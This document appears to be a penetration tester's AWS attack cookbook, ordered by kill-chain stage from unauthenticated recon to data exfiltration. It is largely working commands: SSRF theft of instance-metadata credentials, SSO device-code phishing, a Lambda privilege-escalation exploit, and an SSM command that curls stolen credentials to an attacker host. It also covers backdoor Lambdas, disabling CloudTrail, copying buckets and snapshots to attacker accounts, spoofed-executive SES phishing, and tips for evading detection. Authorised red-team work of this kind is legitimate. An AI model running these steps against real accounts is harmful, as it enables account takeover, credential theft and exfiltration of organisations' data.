# AWS Cookbook

Kill-chain ordered. Recon → Initial Access → Enumeration → Privilege Escalation → Lateral Movement → Persistence → Data Exfiltration. Each section starts with the unauthenticated/external version, then assumes initial creds, then assumes privilege.

Conventions: `$PROFILE` for the AWS CLI profile, `$ACCOUNT_ID` for the target account ID, `$REGION` for region. Output to stdout unless otherwise noted.

---

## 1. Recon (unauthenticated)

### Enumerate accounts via root email

```bash
# Confirm whether an email is a valid AWS root user (timing-based)
# Old technique; AWS has hardened, but still works in some flows.
# Use the AWS console signup flow and observe response timing.

# Better: enumerate accounts via SES bounce behaviour or known account ARNs.
```

### S3 bucket enumeration

```bash
# Common naming patterns
for name in "$COMPANY" "$COMPANY-backup" "$COMPANY-prod" "$COMPANY-dev" "$COMPANY-static" "$COMPANY-logs" "$COMPANY-data"; do
  curl -s -o /dev/null -w "%{http_code} %{url}\n" "https://$name.s3.amazonaws.com/"
done

# Automate with cloud_enum
python3 cloud_enum.py -k "$COMPANY" -k "$COMPANY-prod" -t 20

# Or s3scanner (more recent)
s3scanner scan --bucket-list buckets.txt --threads 50

# Once a bucket is found, list its contents (if public)
aws s3 ls s3://$BUCKET_NAME --no-sign-request
aws s3api list-objects-v2 --bucket $BUCKET_NAME --no-sign-request

# Check bucket policy / ACL without auth
curl "https://$BUCKET_NAME.s3.amazonaws.com/?policy"
curl "https://$BUCKET_NAME.s3.amazonaws.com/?acl"
```

### Account ID disclosure

If you've found a single public artefact, you often have the account ID for free:

- Public S3 bucket ARN: `arn:aws:s3:::bucketname/...` — bucket name alone, no account, but…
- CloudFront distribution OAI: includes account.
- Any role ARN leaked in error messages, IAM policy, JWT issuer claim.
- The bucket region API: `curl -I https://$BUCKET.s3.amazonaws.com` returns `x-amz-bucket-region`.
- For an Cognito-backed app: the IdentityPool ID and UserPool ID embedded in front-end JS contain the account ID portion.

### Subdomain takeovers via misconfigured CloudFront / S3

```bash
# Find subdomains pointing at AWS endpoints
subfinder -d $TARGET_DOMAIN -all -recursive | tee subdomains.txt
dnsx -l subdomains.txt -cname -resp -silent | grep -E 's3.amazonaws.com|cloudfront.net|elasticbeanstalk.com|elb.amazonaws.com'

# For each CNAME pointing to an AWS endpoint, test for takeover
nuclei -l potential_takeovers.txt -t http/takeovers/
```

### Cognito unauthenticated access

If a UserPool / IdentityPool is exposed in JavaScript:

```bash
# Sign up for an account (if signup enabled)
aws cognito-idp sign-up \
  --client-id $CLIENT_ID \
  --username "attacker@example.com" \
  --password "SomePassword123!"

# Or use the unauthenticated role of an IdentityPool
aws cognito-identity get-id --identity-pool-id $POOL_ID
aws cognito-identity get-credentials-for-identity --identity-id $ID
# Returns AccessKey/SecretKey/SessionToken for the unauth role.
# Now enumerate what the unauth role can do.
```

### Public AMI / EBS snapshot search

```bash
# AMIs shared publicly that contain customer data — sometimes leaked
aws ec2 describe-images --owners $TARGET_ACCOUNT_ID --executable-users all

# Public EBS snapshots from a target account
aws ec2 describe-snapshots --owner-ids $TARGET_ACCOUNT_ID --restorable-by-user-ids all
```

---

**Maps to:** F-AWS-S3-001/002 (public S3 access), F-AWS-S3-010 (public EBS snapshot), F-AWS-EC2-004 (public IP on backend instance).

---

## 2. Initial access

### Leaked / found credentials

Most cloud compromises start here. Sources:

- GitHub, GitLab, BitBucket public repos
- Docker Hub images (env vars baked in)
- Postman, swagger.json, archive.org
- Stack Overflow answers
- Mobile app reverse engineering (decompiled APK / IPA strings)

```bash
# Validate credentials quickly
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity

# If creds work, immediately profile permissions
AWS_PROFILE=victim enumerate-iam --access-key AKIA... --secret-key ... --session-token ... > permissions.json
```

### Exposed metadata via SSRF

The classic. A web app vulnerable to SSRF, hosted on EC2, lets you ride out to IMDS:

```bash
# IMDSv1 (legacy, hopefully off — but check)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
# Returns AccessKeyId, SecretAccessKey, Token. Export as env vars and use.

# IMDSv2 (PUT-token required)
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 can be reached via SSRF only if PUT methods are forwarded.
# Most "SSRF as GET only" payloads cannot reach IMDSv2.
# This is exactly why IMDSv2-required mode is a critical control.
```

For container workloads (ECS / EKS), the metadata is at a different endpoint:

```bash
# ECS task metadata + creds
curl ${ECS_CONTAINER_METADATA_URI_V4}/task
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# EKS pod with IRSA
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
# This is a JWT; exchange via STS AssumeRoleWithWebIdentity to get AWS creds.
```

### Phishing for IAM Identity Center / AWS SSO

Modern AWS shops use Identity Center (formerly SSO). Phishing the device code flow is the cloud equivalent of AiTM:

```bash
# Initiate device authorization
aws sso-oidc start-device-authorization --client-id $CLIENT_ID \
  --client-secret $SECRET --start-url https://$ORG.awsapps.com/start

# Returns user_code, verification_uri_complete.
# Send the verification_uri to the victim, they authenticate, you poll for token:
aws sso-oidc create-token --client-id $CLIENT_ID --client-secret $SECRET \
  --grant-type "urn:ietf:params:oauth:grant-type:device_code" \
  --device-code $DEVICE_CODE
# Returns access_token usable against sso:GetRoleCredentials.
```

See Christophe Tafani-Dereeper's blog post for the full technique walkthrough.

### Public RDS / Redshift / OpenSearch

```bash
# Quick check whether an RDS endpoint is publicly reachable
nmap -sV -Pn -p 3306,5432,1433,1521,27017 $RDS_ENDPOINT

# Often left publicly accessible with weak credentials post-restore.
# Try default master usernames: postgres, admin, master, root.
```

---

**Maps to:** F-AWS-IAM-005/006 (leaked / unrotated access keys), F-AWS-EC2-001 (IMDSv1 SSRF credential theft), F-AWS-IAM-014 (MFA not required for SSO — phishing), F-AWS-RDS-001 (publicly accessible RDS).

---

## 3. Authenticated enumeration

Once you have creds, immediate priorities: identity, permissions, account-wide visibility.

### Whoami

```bash
aws sts get-caller-identity
# Account, ARN, UserId

# Resolve the account alias if available
aws iam list-account-aliases
```

### Enumerate own permissions

```bash
# enumerate-iam — comprehensive but noisy
enumerate-iam --access-key $AK --secret-key $SK --session-token $ST

# Pacu — has dedicated modules
pacu
> import_keys victim
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
> run iam__detect_honeytokens

# Or directly:
aws iam get-user
aws iam list-attached-user-policies --user-name $ME
aws iam list-user-policies --user-name $ME
aws iam list-groups-for-user --user-name $ME
# For each group, repeat policy lookups.

# For roles
aws iam get-role --role-name $ME_ROLE
aws iam list-attached-role-policies --role-name $ME_ROLE
aws iam list-role-policies --role-name $ME_ROLE

# Then simulate to confirm
aws iam simulate-principal-policy --policy-source-arn $MY_ARN --action-names "s3:*" "iam:*"
```

### CloudFox — fast account-wide enumeration

```bash
# Build the inventory
cloudfox aws --profile $PROFILE all-checks

# Specific high-value checks
cloudfox aws --profile $PROFILE inventory       # account inventory
cloudfox aws --profile $PROFILE permissions      # who can do what
cloudfox aws --profile $PROFILE iam-simulator    # quick simulate
cloudfox aws --profile $PROFILE secrets          # secrets in tags, user data, lambda env vars
cloudfox aws --profile $PROFILE pmapper          # generate pmapper-format graph
cloudfox aws --profile $PROFILE buckets          # accessible S3
cloudfox aws --profile $PROFILE filesystems      # EFS / FSx
cloudfox aws --profile $PROFILE endpoints        # public-facing endpoints
cloudfox aws --profile $PROFILE ram              # RAM-shared resources from other accounts
```

### Account inventory

```bash
# Organizations
aws organizations describe-organization
aws organizations list-accounts
aws organizations list-policies --filter SERVICE_CONTROL_POLICY
aws organizations list-targets-for-policy --policy-id $POLICY_ID

# Account-wide resource search via AWS Config aggregator (if you have access)
aws configservice select-aggregate-resource-config \
  --configuration-aggregator-name org-aggregator \
  --expression "SELECT resourceType, accountId, awsRegion, resourceId WHERE resourceType = 'AWS::IAM::User'"

# Or via Resource Explorer (Lake Formation / AWS Resource Explorer)
aws resource-explorer-2 search --query-string "service:iam"

# Or Cost Explorer / billing (sometimes accessible via wider role)
aws ce get-cost-and-usage --time-period Start=2026-01-01,End=2026-01-31 \
  --granularity MONTHLY --metrics BlendedCost --group-by Type=DIMENSION,Key=SERVICE
```

### IAM enumeration in depth

```bash
# All principals
aws iam list-users
aws iam list-roles
aws iam list-groups

# Cross-account trust relationships — these are the gold
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `:root`) || contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam`)]'

# For each role, get the assume-role policy doc
for role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  echo "=== $role ==="
  aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument'
done

# Identity providers (federation)
aws iam list-saml-providers
aws iam list-open-id-connect-providers
# OIDC providers with GitHub Actions trust are a juicy target — see priv-esc below
```

### Storage enumeration

```bash
# S3
aws s3api list-buckets --query 'Buckets[].Name'
for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
  echo "=== $bucket ==="
  aws s3api get-bucket-policy --bucket $bucket 2>/dev/null
  aws s3api get-bucket-acl --bucket $bucket 2>/dev/null
  aws s3api get-bucket-versioning --bucket $bucket
  aws s3api get-bucket-encryption --bucket $bucket 2>/dev/null
  aws s3api get-public-access-block --bucket $bucket 2>/dev/null
done
```

### Compute enumeration

```bash
# EC2 - per region
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "=== $region ==="
  aws ec2 describe-instances --region $region \
    --query 'Reservations[].Instances[].[InstanceId,State.Name,PrivateIpAddress,PublicIpAddress,IamInstanceProfile.Arn,Tags[?Key==`Name`].Value|[0]]' \
    --output table
done

# Find IMDSv1-enabled instances (high-value target)
aws ec2 describe-instances \
  --filters "Name=metadata-options.http-tokens,Values=optional" \
  --query 'Reservations[].Instances[].[InstanceId,IamInstanceProfile.Arn]' \
  --output table

# User data — often contains secrets
for instance in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do
  aws ec2 describe-instance-attribute --instance-id $instance --attribute userData \
    --query 'UserData.Value' --output text | base64 -d
done

# Lambda
aws lambda list-functions --query 'Functions[].[FunctionName,Runtime,Role,Environment.Variables]' --output table
# Environment variables are the secrets jackpot.
```

### Secrets enumeration

```bash
# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id $SECRET_ARN

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption \
  --query 'Parameters[].[Name,Value]' --output table

# KMS — list, check policies
aws kms list-keys
aws kms list-aliases
for key in $(aws kms list-keys --query 'Keys[].KeyId' --output text); do
  aws kms get-key-policy --key-id $key --policy-name default
done
```

---

## 4. Privilege escalation

The 21 classic AWS IAM privilege-escalation paths come from Rhino Security Labs' 2018 research; they still mostly work today. Reference: [github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation](https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation).

Run PMapper to map them automatically:

```bash
pip install principalmapper
pmapper --profile $PROFILE graph create
pmapper --profile $PROFILE query "preset privesc *"
pmapper --profile $PROFILE visualize --filetype svg
```

Cloudsplaining for "what *can* every principal do?":

```bash
aws iam get-account-authorization-details > authz.json
cloudsplaining scan --input-file authz.json --output-directory ./cloudsplaining-report/
```

The high-value paths to look for manually:

### `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

Account takeover in 3 API calls:

```bash
# Find a high-privilege role you can pass
aws iam list-roles --query 'Roles[].[RoleName,Arn]'

# Create a lambda that assumes that role
cat > exploit.py <<'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
EOF
zip exploit.zip exploit.py

aws lambda create-function --function-name exploit \
  --runtime python3.11 --role $HIGH_PRIV_ROLE_ARN \
  --handler exploit.handler --zip-file fileb://exploit.zip

aws lambda invoke --function-name exploit /tmp/out.json
```

### `iam:CreateAccessKey` on another user

```bash
aws iam create-access-key --user-name $TARGET_USER
# Returns AccessKey/SecretKey for that user. Now you're them.
```

### `iam:UpdateAssumeRolePolicy` on a high-priv role

```bash
cat > trust.json <<EOF
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"$YOUR_ARN"},"Action":"sts:AssumeRole"}]}
EOF
aws iam update-assume-role-policy --role-name $HIGH_PRIV_ROLE --policy-document file://trust.json
aws sts assume-role --role-arn $HIGH_PRIV_ROLE_ARN --role-session-name pwn
```

### `iam:AttachUserPolicy` or `iam:PutUserPolicy` on self

```bash
aws iam attach-user-policy --user-name $ME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion`

If a managed policy you can write to is attached to yourself or a role you assume:

```bash
aws iam create-policy-version --policy-arn $POLICY_ARN \
  --policy-document file://admin-policy.json --set-as-default
```

### OIDC trust on GitHub Actions

If a role trusts `token.actions.githubusercontent.com` with a sloppy subject filter (e.g. wildcard branch):

```bash
# Find OIDC providers
aws iam list-open-id-connect-providers
# For each, get the trust policy of any role trusting it
aws iam list-roles --query 'Roles[?contains(to_string(AssumeRolePolicyDocument), `token.actions.githubusercontent.com`)]'
```

If the trust filters on `repo:org/repo:*` without branch restriction, you can fork the repo, run a workflow on a branch you control, and AssumeRole. Reference: Chris Tafani-Dereeper's UK gov case study.

### SSM `ssm:SendCommand` on a privileged instance

```bash
# Find instances with high-privilege role
aws ec2 describe-instances --query 'Reservations[].Instances[?IamInstanceProfile!=null]'
# Send a command that exfils its STS creds
aws ssm send-command --instance-ids $INSTANCE_ID \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl http://attacker/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/))"]'
```

### Cross-account confused deputy

Roles trusting third-party accounts without an `sts:ExternalId` condition are vulnerable to confused-deputy abuse. Search for them:

```bash
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=null && !not_null(Condition.StringEquals."sts:ExternalId")]]'
```

---

**Maps to:** F-AWS-IAM-020 (privilege-escalation path identified), F-AWS-IAM-008 (wildcard action+resource policy), F-AWS-IAM-021 (GitHub Actions OIDC trust misconfigured), F-AWS-LAM-001 (Lambda wildcard principal — PassRole chain).

---

## 5. Lateral movement

In AWS, lateral movement = assume new roles, hop across accounts, pivot via shared resources.

### Role chaining

```bash
aws sts assume-role --role-arn $ROLE_A --role-session-name a
# Use returned credentials
aws sts assume-role --role-arn $ROLE_B --role-session-name b
# Etc. Track the chain in your notes.
```

### Cross-account via RAM (Resource Access Manager)

```bash
# What's shared with us / by us
aws ram get-resource-shares --resource-owner SELF
aws ram get-resource-shares --resource-owner OTHER-ACCOUNTS
aws ram get-resource-share-associations --association-type RESOURCE
```

### Cross-account via VPC peering / Transit Gateway

```bash
aws ec2 describe-vpc-peering-connections
aws ec2 describe-transit-gateway-attachments
# Peered VPCs in other accounts often allow SSH/RDP/DB from the source account.
```

### Pivot to on-prem via Direct Connect / VPN

```bash
aws ec2 describe-vpn-connections
aws directconnect describe-connections
aws directconnect describe-virtual-interfaces
# If on-prem network is routable, this is the bridge.
```

### Lateral into EKS

```bash
# Get EKS clusters
aws eks list-clusters
aws eks describe-cluster --name $CLUSTER

# If your IAM role / user is in aws-auth ConfigMap, you can update kubeconfig:
aws eks update-kubeconfig --name $CLUSTER --region $REGION
kubectl get pods -A
kubectl auth can-i --list

# Find pods with elevated RBAC or hostPath mounts
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
```

### S3 cross-account access

```bash
# Buckets in other accounts you can access via bucket policy
aws s3 ls s3://$BUCKET_IN_OTHER_ACCOUNT/
```

### SES for phishing

```bash
# Verified identities (domains you can spoof from)
aws ses list-identities
# Send phishing from a legit domain
aws ses send-email --from "ceo@corp.com" --destination "ToAddresses=victim@corp.com" --message ...
```

---

**Maps to:** F-AWS-IAM-010 (overly permissive role trust — role chaining), F-AWS-IAM-022 (cross-account confused deputy), F-AWS-EKS-001/004 (lateral into EKS via public endpoint / broad node role).

---

## 6. Persistence

### Console access via the API

```bash
# Create a login profile on an existing programmatic-only user
aws iam create-login-profile --user-name $TARGET --password 'P@ssw0rd123!' --no-password-reset-required
```

### Additional access keys

```bash
aws iam create-access-key --user-name $TARGET
# IAM allows 2 per user. If they already have 2, you may need to delete one.
```

### Lambda backdoor

```bash
# Create a Lambda that runs on a CloudWatch schedule and re-attaches AdminAccess on demand
aws lambda create-function --function-name maint-helper \
  --runtime python3.11 --role $ROLE_ARN --handler index.handler \
  --zip-file fileb://backdoor.zip
aws events put-rule --name daily --schedule-expression 'rate(1 day)'
aws events put-targets --rule daily --targets "Id=1,Arn=$LAMBDA_ARN"
```

### Custom CloudTrail to a bucket you own

```bash
# Stop / redirect logging in the account (visible action)
aws cloudtrail stop-logging --name $TRAIL_NAME
aws cloudtrail update-trail --name $TRAIL_NAME --s3-bucket-name $ATTACKER_BUCKET
```

This is **loud** — GuardDuty will flag `CloudTrailLoggingDisabled`. Use only on engagements where detection is in scope.

### Add a trust to an external account on an existing role

```bash
aws iam update-assume-role-policy --role-name $ROLE \
  --policy-document '{"Version":"2012-10-17","Statement":[<existing_stmt>,{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCT:root"},"Action":"sts:AssumeRole"}]}'
```

### IAM session policy attached to STS via federation

If you have console access via SAML/OIDC and can edit the federation principal, you can keep a long-term backdoor without leaving an IAM user behind.

---

**Maps to:** F-AWS-IAM-001/004 (rogue console access / extra keys), F-AWS-IAM-010 (external trust added to existing role), F-AWS-LAM-001 (Lambda backdoor), F-AWS-LOG-001 (attacker-controlled parallel CloudTrail).

---

## 7. Data exfiltration

Always coordinate with the customer first. Default for a pentest: prove access, screenshot metadata, do not exfil real data.

### S3 to attacker bucket

```bash
aws s3 sync s3://$TARGET_BUCKET s3://$ATTACKER_BUCKET --source-region $REGION
# Or to local
aws s3 sync s3://$TARGET_BUCKET ./loot/
```

### EBS snapshot share

```bash
# Snapshot an interesting volume
aws ec2 create-snapshot --volume-id $VOL --description "backup"
# Share with attacker account
aws ec2 modify-snapshot-attribute --snapshot-id $SNAP \
  --create-volume-permission "Add=[{UserId=ATTACKER_ACCT}]"
# Restore in attacker account
```

### RDS snapshot share

```bash
aws rds create-db-snapshot --db-snapshot-identifier $NAME --db-instance-identifier $DB
aws rds modify-db-snapshot-attribute --db-snapshot-identifier $NAME \
  --attribute-name restore --values-to-add $ATTACKER_ACCT
```

### DynamoDB export

```bash
aws dynamodb export-table-to-point-in-time --table-arn $TABLE_ARN \
  --s3-bucket $ATTACKER_BUCKET --export-format DYNAMODB_JSON
```

### Logs to attacker

```bash
# CloudWatch Logs subscription to attacker-controlled destination
aws logs put-subscription-filter --log-group-name $LG \
  --filter-name exfil --filter-pattern "" \
  --destination-arn arn:aws:logs:us-east-1:ATTACKER_ACCT:destination:exfil
```

---

**Maps to:** F-AWS-S3-007 (wildcard bucket policy), F-AWS-S3-010 (public EBS snapshot share), F-AWS-RDS-006 (public DB snapshot share), F-AWS-CRY-002 (KMS key policy wildcard principal).

---

## 8. Detection-aware reminders

Each of the above generates CloudTrail events. For red team / TLPT engagements, blend timing and identity selection to avoid trivial detection:

- Reuse compromised identities; don't spin up new ones.
- Don't make calls outside the historical pattern of the compromised principal (use CloudTrail Insights as the customer would).
- Avoid high-frequency enumeration; rate-limit to match human pace.
- For long-running engagements, use STS short-term creds with `--duration-seconds` minimums.
- Stratus Red Team is great for validating that you *can* be caught at each step — run it post-engagement against the customer's detections.

## References

- [Rhino Security Labs IAM Privilege Escalation](https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation)
- [Hacking the Cloud (AWS section)](https://hackingthe.cloud/aws/)
- [Nick Frichette's AWS techniques](https://hackingthe.cloud/aws/general-knowledge/) and [his blog](https://frichetten.com/blog/)
- [CloudFox docs](https://github.com/BishopFox/cloudfox)
- [Pacu modules](https://github.com/RhinoSecurityLabs/pacu)
- [Stratus Red Team techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [HackTricks AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/)
